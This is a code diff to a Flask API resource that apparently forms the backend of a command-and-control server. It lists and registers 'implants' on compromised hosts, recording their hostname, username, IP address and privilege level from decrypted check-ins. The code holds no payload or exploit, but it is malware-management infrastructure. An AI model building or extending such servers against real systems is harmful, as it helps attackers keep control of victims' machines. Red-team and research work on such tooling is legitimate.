@@ -18,7 +18,7 @@ class agents(Resource):
 
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("SELECT implant_hostname,implant_username,ip_address FROM implants")
+            cursor.execute("SELECT * FROM implants")
             rows = cursor.fetchall()
 
             csv_string = ""
@@ -29,7 +29,7 @@ class agents(Resource):
 
             conn.close()
 
-
+            return csv_string, 200
 
 
 
@@ -49,17 +49,13 @@ class agents(Resource):
             
             data = decrypted_data.split(',,')
             hostname = data[0]
-            print(hostname)
             username = data[1]
-            print(username)
             privilege = data[2]
-            print(privilege)
             ipaddress = request.remote_addr
-            print(ipaddress)
 
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("INSERT INTO implants (implant_hostname, implant_username, ip_address) VALUES (?, ?, ?)", (hostname, username, ipaddress))
+            cursor.execute("INSERT INTO implants (implant_hostname, implant_username, ip_address, implant_shell) VALUES (?, ?, ?, ?)", (hostname, username, ipaddress, privilege))
             conn.commit()
             implant_id = cursor.lastrowid
             conn.close()
